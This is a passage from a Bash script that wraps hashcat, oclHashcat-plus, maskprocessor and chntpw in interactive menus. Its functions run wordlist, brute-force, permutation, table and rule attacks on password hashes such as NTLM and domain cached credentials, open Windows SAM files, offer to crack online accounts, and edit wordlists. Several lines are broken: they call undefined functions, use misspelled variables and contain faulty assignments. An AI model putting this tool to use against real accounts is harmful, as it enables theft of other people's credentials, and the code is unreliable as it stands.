					echo 'i=iI|!' >> $table
					echo 'j=jJ' >> $table
					echo 'k=kK' >> $table
					echo 'l=lL1' >> $table
					echo 'm=mM' >> $table
					echo 'n=nN' >> $table
					echo 'o=oO0' >> $table
					echo 'r=rR' >> $table
					echo 's=sS$' >> $table
					echo 't=tT+' >> $table
					echo 'u=uU' >> $table
					echo 'v=vV' >> $table
					echo 'w=wW' >> $table
					echo 'x=xX' >> $table
					echo 'y=yY' >> $table
					echo 'z=zZ' >> $table
					echo '0=0123456789' >> $table
					
					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --table-file=$table --table-min=$table_min --table-max=$table_max -o $outfile --output-format=1  $hash_path $wordlist
					
					rm -f $table
					
					f_hashcat_output
					
				}

				f_hashcat_rule () {

					hashcat_rule_cho=0
					rule_file=1
					rule_maskprocessor=2
					menu=3
					until [ $hashcat_rule_cho == $rule_file ] || [ $hashcat_rule_cho == $rule_maskprocessor ] || [ $hashcat_rule_cho == $menu ]; do
						f_art
						echo "Options : "
						echo ""
						echo "1) Use An Existing Rule"
						echo "2) Generate A Custom Rule"
						echo "3) Main Menu"
						echo ""
						echo -n "Choice : "
						read hashcat_rule_cho
					done

					case $hashcat_rule_cho in

					1)  echo -n "Input The Rule Full Path (es: /home/user/rule/myrule.rule) : "
						read rulepath
						hashcat --threads=$thread --hash-mode=$hash_type -r $rulepath -o $outfile --output-format=1 $hash_path $wordlist
						f_hashcat_output
						;;

					2)  f_mask_processor
						mp32 $mp32 | hashcat --threads=$thread --hash-mode=$hash_type -o $outfile --output-format=1 $hash_path $wordlist
						f_hashcat_output
						;;

					3) f_return_to_menu ;;
					
					esac
					
				}

				attack_mode=10
				straight=0
                combination=1
                toggle_case=2
                brute=3
                permute=4
                table=5
                rule=6
				menu=7
				until [ $attack_mode == $straight ] || [ $attack_mode == $combination ] || [ $attack_mode == $toggle_case ] || [ $attack_mode == $brute ] || [ $attack_mode == $permute ] || [ $attack_mode == $table ] || [ $attack_mode == $rule ] || [ $attack_mode == $menu ]; do
					f_art
					echo "Attack Mode Selection : "
					echo ""
					echo "0) Straight (Wordlist Attack)"
					echo "1) Combination Attack"
					echo "2) Toggle Case Attack"
					echo "3) Brute Force Attack"
					echo "4) Permutation Attack"
					echo "5) Table lookUp Attack"
					echo "6) Rule Mangling Attack"
					echo "7) Main Menu"
					echo ""
					echo -n "Selection : "
					read attack_mode
				done

				if [ $attack_mode != $menu ]; then
					echo -n "Input THe Threads Number (es: 4) : "
					read thread

					f_hashcat_hash

					echo -n "Input The HashFile Full Path (es: /home/user/myhash.hash) : "
					read hash_path
					
					if [ $attack_mode != $brute ]; then
						if [ $attack_mode != $combination ]; then
							echo -n "Input The Wordlist Full Path (es: /home/user/wordlist.txt) : "
							read wordlist
						fi
					fi
					
					echo -n "Input The Output File For The Cracked Hashes (es: /home/user/hash_cracked.txt ) : "
					read outfile 
				fi

				case $attack_mode in

				0) f_hashcat_wordlist ;;

				1) f_hashcat_combination ;;

				2) f_hashcat_toggle_case ;;

				3) f_hashcat_bruteforce ;;

				4) f_hashcat_permute ;;

				5) f_hashcat_table ;;

				6) f_hashcat_rule ;;

				7) f_return_to_menu ;;

				esac

			}
			
			# OclHashcat-Lite
			f_oclhashcat_lite () {
				
				f_return_to_menu

			}

			# OclHashcat-Plus
			f_oclhashcat_plus () {
				
				# Hash Type Selection
				f_hashcat_hash () {

					hash_type=999
					MD5=0
					md5_pass_salt=1
					md5_salt_pass=2
					md5_md5_pass=3
					md5_md5_md5_pass=4
					vBulletin1=5
					md5_md5_salt_pass=6
					md5_salt_md5_pass=7
					md5_salt_pass_salt=8
					md5_md5_salt_md5_pass=9
					md5_md5_pass_md5_salt=10
					md5_salt_md5_salt_pass=11
					md5_salt_md5_pass_salt=12
					vBulletin2=15
					md5_username_0_pass=30
					md5_strtoupper_md5_pass=31
					SHA1=100
					sha1_pass_salt=101
					sha1_salt_pass=102
					sha1_sha1_pass=103
					sha1_sha1_sha1_pass=104
					sha1_strtolower_username_pass=105
					MySQL=200
					MySQL4_1_5=300
					MD5_Wordpress=400
					MD5_phpBB3=400
					MD5_Unix=500
					SHA1_Base64=600
					SSHA1_Base64=700
					SHA1_Django=800
					MD4=900
					NTLM=1000
					Domain_Cached_Credentials=1100
					MD5_Chap=1200
					MSSQL=1300
					SHA256=1400
					MD5_APR=1600
					SHA512=1700
					SHA512_unix=1800

					until [ $hash_type == $MD5 ] || [ $hash_type == $md5_pass_salt ] || [ $hash_type == $md5_salt_pass ] || [ $hash_type == $md5_md5_pass ] || [ $hash_type == $md5_md5_md5_pass ] || [ $hash_type == $vBulletin1 ] || [ $hash_type == $md5_md5_salt_pass ] || [ $hash_type == $md5_salt_md5_pass ] || [ $hash_type == $md5_salt_pass_salt ] || [ $hash_type == $md5_md5_salt_md5_pass ] || [ $hash_type == $md5_md5_pass_md5_salt ] || [ $hash_type == $md5_salt_md5_salt_pass ] || [ $hash_type == $md5_salt_md5_pass_salt ] || [ $hash_type == $vBulletin2 ] || [ $hash_type == $md5_username_0_pass ] || [ $hash_type == $md5_strtoupper_md5_pass ] || [ $hash_type == $SHA1 ] || [ $hash_type == $sha1_pass_salt ] || [ $hash_type == $sha1_salt_pass ] || [ $hash_type == $sha1_sha1_pass ] || [ $hash_type == $sha1_sha1_sha1_pass ] || [ $hash_type == $sha1_strtolower_username_pass ] || [ $hash_type == $MySQL ] || [ $hash_type == $MySQL4_1_5 ] || [ $hash_type == $MD5_Wordpress ] || [ $hash_type == $MD5_phpBB3 ] || [ $hash_type == $MD5_Unix ] || [ $hash_type == $SHA1_Base64 ] || [ $hash_type == $SSHA1_Base64 ] || [ $hash_type == $SHA1_Django ] || [ $hash_type == $MD4 ] || [ $hash_type == $NTLM ] || [ $hash_type == $Domain_Cached_Credentials ] || [ $hash_type == $MD5_Chap ] || [ $hash_type == $MSSQL ] || [ $hash_type == $SHA256 ] || [ $hash_type == $MD5_APR ] || [ $hash_type == $SHA512 ] || [ $hash_type == $SHA512_unix ]; do
						f_art
						echo "HashType Selection :"
						echo ""
						echo "0) MD5"
						echo "1) md5(pass.salt)"
						echo "2) md5(salt.pass)"
						echo "3) md5(md5(pass))"
						echo "4) md5(md5(md5(pass)))"
						echo "5) vBulletin < v3.8.5"
						echo "6) md5(md5(salt).pass)"
						echo "7) md5(salt.md5(pass))"
						echo "8) md5(salt.pass.salt)"
						echo "9) md5(md5(salt).md5(pass))"
						echo "10) md5(md5(pass).md5(salt))"
						echo "11) md5(salt.md5(salt.pass))"
						echo "12) md5(salt.md5(pass.salt))"
						echo "15) vBulletin > v3.8.5"
						echo "30) md5(username.0.pass)"
						echo "31) md5(strtoupper(md5(pass)))"
						echo "100) SHA1"
						echo "101) sha1(pass.salt)"
						echo "102) sha1(salt.pass)"
						echo "103) sha1(sha1(pass))"
						echo "104) sha1(sha1(sha1(pass)))"
						echo "105) sha1(strtolower(username).pass)"
						echo "200) MySQL"
						echo "300) MySQL4.1/MySQL5"
						echo "400) MD5(Wordpress)"
						echo "400) MD5(phpBB3)"
						echo "500) MD5(Unix)"
						echo "600) SHA-1(Base64)"
						echo "700) SSHA-1(Base64)"
						echo "800) SHA-1(Django)"
						echo "900) MD4"
						echo "1000) NTLM"
						echo "1100) Domain Cached Credentials"
						echo "1200) MD5(Chap)"
						echo "1300) MSSQL"
						echo "1400) SHA256"
						echo "1600) MD5(APR)"
						echo "1700) SHA512"
						echo "1800) SHA-512(Unix)"
						echo ""
						echo ""
						echo -n "Choice : "
						read hash_type
					done	
				
				}

				# Attack Modes
				f_oclhashcat_plus_wordlist () { # Hash every Word From The Wordlist And Confront It With The Hash
					
					oclhashcat-plus --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --outfile=$outfile --output-format=3 $hash_path $wordlist
					
					f_hashcat_output
					
				}
				
				f_oclhashcat_combination () { # Combine The Word Of Two Wordlist : 1) word + 2) 12 ----> word12 | 12word
					
					f_art
					
					echo -n "Input The First Wordlist Full Path (es: /home/user/wordlist_1_.txt) : "
					read wordlist_1
					
					echo ""
					
					echo -n "Input The Second Wordlist Full Path (es: /home/user/wordlist_2.txt) : "
					read wordlist_2
					
					oclhashcat-plus --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --outfile=$outfile --output-format=3 $hash_path $wordlist_1 $wordlist_2
					
					f_hashcat_output
					
				}

				f_oclhashcat_bruteforce () { # Every Combination From $charset

					echo -n "Insert The Minimum Password Lenght : "
					read pwd_min

					echo -n "Insert The Maximum Password Lenght : "
					read pwd_max

					f_charset

					oclhashcat-plus --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --bf-pw-min=$pwd_min  --bf-pw-max=$pws_max --bf-cs-buf=$charset --outfile=$outfile --output-format=3 $hash_path
					
					f_hashcat_output
					
				}

				f_oclhashcat_permute () { # ABC ---> ABC | ACB | BAC | BCA | CAB | CBA
					
					f_art
					
					echo -n "Input The Minimum Password Lenght (min 1) : "
					read perm_min
					
					echo ""
					
					echo -n "Input The Maximum Password Lenght (max 16) : "
					read perm_max
					
					oclhashcat-plus --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --perm-min=$perm_min --perm-max=$perm_max --outfile=$outfile --output-format=3 $hash_path $wordlist
					
					f_hashcat_output
					
				}

				f_oclhashcat_rule () {

					hashcat_rule_cho=0
					rule_file=1
					rule_maskprocessor=2
					menu=3
					until [ $hashcat_rule_cho == $rule_file ] || [ $hashcat_rule_cho == $rule_maskprocessor ] || [ $hashcat_rule_cho == $menu ]; do
						f_art
						echo "Options : "
						echo ""
						echo "1) Use An Existing Rule"
						echo "2) Generate A Custom Rule"
						echo "3) Main Menu"
						echo ""
						echo -n "Choice : "
						read hashcat_rule_cho
					done

					case $hashcat_rule_cho in

					1)  echo -n "Input The Rule Full Path (es: /home/user/rule/myrule.rule) : "
						read rulepath
						oclhashcat-plus --threads=$thread --hash-mode=$hash_type -r $rulepath --outfile=$outfile --output-format=3 $hash_path $wordlist
						f_hashcat_output
						;;

					2)  f_mask_processor
						mp32 $mp32 | oclhashcat-plus --threads=$thread --hash-mode=$hash_type --outfile=$outfile --output-format=3 $hash_path $wordlist
						f_hashcat_output
						;;

					3) f_return_to_menu ;;
					
					esac
					
				}

				attack_mode=10
				straight=0
                combination=1
                brute=3
                permute=4
                rule=6
				menu=7
				until [ $attack_mode == $straight ] || [ $attack_mode == $combination ] || [ $attack_mode == $toggle_case ] || [ $attack_mode == $brute ] || [ $attack_mode == $permute ] || [ $attack_mode == $table ] || [ $attack_mode == $rule ] || [ $attack_mode == $menu ]; do
					f_art
					echo "Attack Mode Selection : "
					echo ""
					echo "0) Straight (Wordlist Attack)"
					echo "1) Combination Attack"
					echo "3) Brute Force Attack"
					echo "4) Permutation Attack"
					echo "6) Rule Mangling Attack"
					echo "7) Main Menu"
					echo ""
					echo -n "Selection : "
					read attack_mode
				done

				if [ $attack_mode != $menu ]; then
					echo -n "Input The Threads Number (es: 4) : "
					read thread

					f_hashcat_hash

					echo -n "Input The HashFile Full Path (es: /home/user/myhash.hash) : "
					read hash_path
					
					if [ $attack_mode != $brute ]; then
						if [ $attack_mode != $combination ]; then
							echo -n "Input The Wordlist Full Path (es: /home/user/wordlist.txt) : "
							read wordlist
						fi
					fi
					
					echo -n "Input The Output File For The Cracked Hashes (es: /home/user/hash_cracked.txt ) : "
					read outfile 
				fi

				case $attack_mode in

				0) f_oclhashcat_plus_wordlist ;;

				3) f_oclhashcat_plus_bruteforce ;;

				4) f_oclhashcat_plus_permute ;;

				6) f_oclhashcat_plus_rule ;;

				7) f_return_to_menu ;;

				esac

			}


			hashcatcho=0
			hashcat_cpu=1
			hashcat_lite=2
			hashcat_plus=3
			menu=4
			until [ $hashcatcho == $hashcat_cpu ] || [ $hashcatcho == $hashcat_lite ] || [ $hashcatcho == $hashcat_plus ] || [ $hashcatcho == $menu ]; do
				f_art
				echo "Hardware Selection : "
				echo ""
				echo "1) Hashcat (CPU)"
				echo "2) OclHashcat Lite (GPU | Only and Best For BruteForce & Mask Attack)"
				echo "3) OclHashcat-Plus (GPU)"
				echo "4) Menu"
				echo ""
				echo "Choice : "
				read hashcatcho
			done

			case $hashcatcho in

			1) f_oclhashcat_cpu ;;

			2) f_oclhashcat_lite ;;

			3) f_oclhashcat_plus ;;

			4) f_return_to_menu ;;

			esac

		}

		f_mask_processor () {

			f_transmutation () {

				transmcho=0
				lower=1
				upper=2
				capitalise=3
				double_word=4
				double_word_reflected=5
				double_all_char=6
				reverse=7
				toggle=8
				menu=9
				until [ $trasmcho == $lower ] || [ $trasmcho == $upper ] || [ $trasmcho == $capitalise ] || [ $trasmcho == $double_word ] || [ $trasmcho == $double_word_reflected ] || [ $trasmcho == $double_all_char ] || [ $trasmcho == $reverse ] || [ $trasmcho == $toggle ] || [ $trasmcho == $menu ]; do
					f_art
					echo "[*] Trasmutation Selection :"
					echo ""
					echo "1) Lower ( wORd ---> word )"

					echo "2) Upper ( wORd ---> WORD )"
					echo "3) Capitalise ( wORd ---> WORd )"
					echo "4) Double Word ( wORd ---> wORdwORd )"
					echo "5) Double Word Reflected ( wORd ---> wORddROw )"
					echo "6) Double All Characters ( wORd ---> wwOORRdd )"
					echo "7) Reverse Word ( wORd ---> dROw )"
					echo "8) Toggle Word ( wORd ---> WorD )"
					echo "9) Main Menu"
					echo ""
					echo -n "Choice : "
					read trasmcho
				done

				case $trasmcho in

				1)  tr=l
				    trasmutation="Lower ( wORd ---> word )"
				    ;;
				2)  tr=u
				    trasmutation="Upper ( wORd ---> WORD )"
				    ;;
				3)  tr=c
					trasmutation="Capitalise ( wORd ---> WORd )"
					;;
				4)  tr=d
					trasmutation="Double Word ( wORd ---> wORdwORd )"
					;;
				5)  tr=f
					trasmutation="Double Word Reflected ( wORd ---> wORddROw )"
					;;
				6)  tr=q
					trasmutation="Double All Characters ( wORd ---> wwOORRdd )"
					;;
				7)  tr=r
					trasmutation="Reverse Word ( wORd ---> dROw )"
					;;
				8)  tr=t
					trasmutation="Toggle Word ( wORd ---> WorD )"
					;;
				9) f_return_to_menu ;;

				esac

			}

			f_suffix () {

				N_suffix=0
				until [ $N_suffix -gt "0" ] && [ $N_suffix -lt "5" ]; do
					f_art
					echo -n "Input How Many Characters You Wanna Add To The Suffix (max 4) : "
					read N_suffix
				done

				f_charset

				charset_suffix="-1 $charset"

				f_art
				echo "Press 1 To Choice Between Transformations, Any Other Key"
				echo -n "To Simply Suffix : "
				read suffix_trasm

				if [ $suffix_trasm == "1" ]; then
					f_transmutation
				else
					tr=""
					trasmutation="No Trasmutation Active"
				fi

				for i in $N_suffix
				do
					echo -n "$?1" >>suffix.tmp.tmp
				done

				char_suffix=(cat suffix.tmp.tmp)
				rm -f suffix.tmp.tmp

			}

			f_append () {

			N_append=0
			until [ $N_append -gt "0" ] && [ $N_append -lt "5" ]; do
				f_art
				sleep 1
				echo -n "Input How Manu Characters You Wanna Append (max 4) : "
				read N_append
			done

			f_charset

			charset_append="-2 $charset"

			if [ $rulecho == $append ]; then
				f_art
				echo ""
				echo "Press 1 To Choice Between Transformations, Any Other Key"
				echo -n "To Simply Append : "
				read append_trasm
				if [ $append_trasm == "1" ]; then
					f_transmutation
				else
					tr=""
					trasmutation="No Trasmutation Active"
				fi
			fi

			for i in $N_append
			do
				echo -n "^?2" >> append.tmp.tmp
			done

			char_append=(cat append.tmp.tmp)
			rm -f append.tmp.tmp

		}

			f_suffix_append () {

				f_suffix

				f_append

			}

			f_rule_generator () {

				f_art

				echo -n "Input The Output Dir Path (es: /home/user/rules) : "
				read path

				echo ""

				echo -n "Input The Rule's Name (es: myrule.rule) : "
				read rule

				f_art

				if [ $rulecho == $suffix ] || [ $rulecho == $suffix_append ]; then
					charset=$(echo $charset_suffix | awk '{print $2}')
					echo "[*] Charset_Suffix :"
					sleep 1
					echo "$charset"
					sleep 2
					echo "[*] Number Of Characters To Suffix : "
					sleep 1
					echo $N_suffix
					sleep 2
				fi

				if [ $rulecho == $append ] || [ $rulecho == $suffix_append ]; then
					charset=$(echo $charset_append | awk '{print $2}')
					echo "[*] Charset_Append :"
					sleep 1
					echo "$charset"
					sleep 2
					echo "[*] Number Of Characters To Append : "
					sleep 1
					echo $N_append
					sleep 2
				fi

				echo "[*] $trasmutation"

				sleep 2

				echo ""
				echo ""
				echo "[*] Working ..."

				mp32 $mp32 -o $path/$rule 1> /dev/null 2> /dev/null

				echo "Done, Your Rule Is In $path/$rule !!!"

				echo ""
				echo ""
				echo -n "Press Any Ley To Go Back To The Main Menu : "
				read key
				f_return_to_menu

			}

			rulecho=0
			transmutation=1
			suffix=2
			append=3
			suffix_append=4
			menu=5
			until [ $rulecho == $transmutation ] ||  [ $rulecho == $suffix ] || [ $rulecho == $append ] || [ $rulecho == $suffix_append ] || [ $rulecho == $menu ]; do
				f_art
				echo "Selection :"
				echo ""
				echo "1) Transmutation (Lower|Upper|Capitalise|Double|Reverse|Toggle)"
				echo "2) Suffix (+ Transmutation)"
				echo "3) Append (+ Transmutation)"
				echo "4) Suffix + Append (+ Transmutation)"
				echo "5) Return To The Main Menu"
				echo ""
				echo -n "Choice : "
				read rulecho
			done

			case $rulecho in

			1)  f_trasmutation
				mp32="$tr"
				;;

			2)  f_suffix
				mp32=$(echo "$charset_suffix £+£$tr$char_suffix£+£" | sed -e 's/£+£/"/g')
				;;

			3)  f_append
				mp32=$(echo "$charset_append £+£$tr$char_append£+£" | sed -e 's/£+£/"/g')
				;;

			4)  f_suffix_append
				mp32=$(echo "$charset_suffix $charset_append £+£$tr$char_suffix$char_append£+£" | sed -e 's/£+£/"/g')
				;;

			5) f_return_to_menu ;;

			esac

			if [ $crackfile == $maskprocessor ]; then
				f_rule_generator
			fi

		}

		f_SAM () {

			f_art
			echo -n "Enter The SAM Path (es : /media/windows/WINDOWS/system32/config/SAM ) : "
			read $SAM

			f_art
			chntpw -i $SAM
			
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
				
			f_art

			f_return_to_menu

		}

		crackfile=0
		pdfcrack=1
		archive=2 # fcrack | rarcrack
		john=3
		hashcat=4
		maskprocessor=5
		chntpw=6
		previousmenu=7
		mainmenu=8
		until [ $crackfile == $pdfcrack ] || [ $crackfile == $archive ] || [ $crackfile == $john ] || [ $crackfile == $hashcat ] || [ $crackfile == $maskprocessor ] || [ $crackfile == $chtnpw ] || [ $crackfile == $previousmenu ] || [ $crackfile == $mainmenu ]; do
			f_art
			echo "Select What You Wanna Do : "
			echo ""
			echo "1) Pdf"
			echo "2) Compressed Archive"
			echo "3) Hash (John The Ripper)"
			echo "4) Hashcat (CPU/GPU)"
			echo "5) MaskProcessor Rules Generator (Hashcat/John)"
			echo "6) Window's SAM"
			echo "7) Previous Menu"
			echo "8) Return To The Main Menu"
			echo ""
			echo -n "Choice : "
			read crackfile
		done

		case $crackfile in

		1) f_pdfcrack ;;

		2) f_archive ;;

		3) f_john ;;

		4) f_hashcat ;;

		5) f_mask_processor ;;

		6) f_SAM ;;

		7) f_passwordcracking ;;

		8) f_return_to_menu ;;

		esac

}

	crack=10
	online=1
	offline=2
	mainmenu=3
	until [ $crack == $online ] || [ $crack == $offline ]; do
		f_art
		echo "Select What You Wanna Do :"
		echo ""
		echo "1) Crack An Online Account or Service"
		echo "2) Crack A Local File Or Hash"
		echo "3) Return To The Main Menu"
		echo ""
		echo -n "Enter Choice : "
		read crack
	done

	case $crack in

	1) f_passwordcracking_online ;;

	2) f_passwordcracking_offline ;;

	3) f_return_to_menu ;;

	esac

}

f_wordlist_editing () {

	f_low () { # Lowerise Every Word

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		clear
		echo -n "Select the output dir (es: /home/user) : "
		read out

		clear
		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname


		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | tr '[:upper:]' '[:lower:]' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_capitalise () { # Capitalise Every Word

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | tr '[:lower:]' '[:upper:]' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_cap_first () { # Capitalise First Letter

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_spaces_null () { # Spaces To Null

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -e 's/ //g' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_spaces_dash () { # Spaces To Dash

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -e 's/ /-/g' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_spaces_underscore () { # Spaces To Underscore

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -e 's/ /_/g' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_spaces_return () { # Spaces To Return

		f_art
		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | tr ' ' '\012' | sed -e 's/ *$//' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_add_begin () { # Add A word at the beginning of every line

		f_art
		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		echo -n "Write the word that you want to add : "
		read wordadd

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -e 's/^/'$wordadd'/' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
				
		f_return_to_menu

}

	f_add_end () { # Add A word at the end of every line

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		echo -n "Write the word that you want to add : "
		read wordadd

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		cat $file | sed -e 's/$/'$wordadd'/' | sort -u >> $out/$outname

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		f_return_to_menu

}

	f_num_begin () { # Numerise Beginning

		f_art
		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		echo -n "Insert The first Number of the sequence : "
		read firstnum

		echo -n "Insert The last Number of the sequence : "
		read lastnum

		echo "Insert the value of the difference beetwen the first and "
		echo -n " the second number : "
		read pass

		echo -n "Select the tmp dir (es: /tmp) : "
		read tmp

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		until [ $firstnum -gt $lastnum ]; do

			echo $firstnum

			cat $file | sed -e 's/^/'$firstnum'/' >> $tmp/$outname_$firstnum.tmp

			firstnum=$[ $firstnum + $pass ]

		done

		cat $tmp/$outname*.tmp | sort -u >> $out/$outname

		( rm -f $tmp/$outname.tmp ) &

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		clear

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_num_end () { # Numerise End

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		echo -n "Insert The first Number of the sequence : "
		read firstnum

		echo -n "Insert The last Number of the sequence : "
		read lastnum

		echo "Insert the value of the difference beetwen the first and "
		echo -n " the second number : "
		read pass

		echo -n "Select the tmp dir (es: /tmp) : "
		read tmp

		f_art
		echo -n "[*] Working ... "
		timelapsed &

		until [ $firstnum -gt $lastnum ]; do

			echo $firstnum

			cat $file | sed -e 's/$/'$firstnum'/' >> $tmp/$outname_$firstnum.tmp

			firstnum=$[ $firstnum + $pass ]

		done

		cat $tmp/$outname*.tmp | sort -u >> $out/$outname

		( rm -f $tmp/$outname.tmp ) &

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		clear

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_all_trasmutation () { # All

		f_art

		echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
		read file

		echo -n "Select the output dir (es: /home/user) : "
		read out

		echo -n "Select the output file name (es: wordlistedited.txt) : "
		read outname

		echo -n "Select the tmp dir (es: /tmp) : "
		read tmp

		f_art

		echo -n "[*] Lowerising Wordlist ... "
		timelapsed &
		cat $file | tr '[:upper:]' '[:lower:]' | sed -e 's/ *$//' >> $tmp/lower.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Capitalising Wordlist ... "
		timelapsed &
		cat $file | tr '[:lower:]' '[:upper:]' | sed -e 's/ *$//' >> $tmp/capitalised.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Capitalising The First Letter ... "
		timelapsed &
		cat $file | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *$//' >> $tmp/firscapitalised.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Merging the Wordlists ... "
		timelapsed &
		cat $tmp/lower.txt $tmp/capitalised.txt $tmp/firscapitalised.txt | sort -u >> $tmp/wordlistedit1.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Spaces To Null ... "
		timelapsed &
		cat $tmp/wordlistedit1.txt | sed -e 's/ //g'>> $tmp/wordlistedit2.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Spaces to Dash (-) ... "
		timelapsed &
		cat $tmp/wordlistedit1.txt | sed -e 's/ /-/g' >> $tmp/wordlistedit3.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Spaces to Underscore (_)... "
		timelapsed &
		cat $tmp/wordlistedit1.txt | sed -e 's/ /_/g' >> $tmp/wordlistedit4.txt
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Spaces to Return ... "
		timelapsed &
		cat $tmp/wordlistedit1.txt | tr ' ' '\012' >> $tmp/wordlistedit5.txt
		touch $HOME/pio.txt
		sleep 1
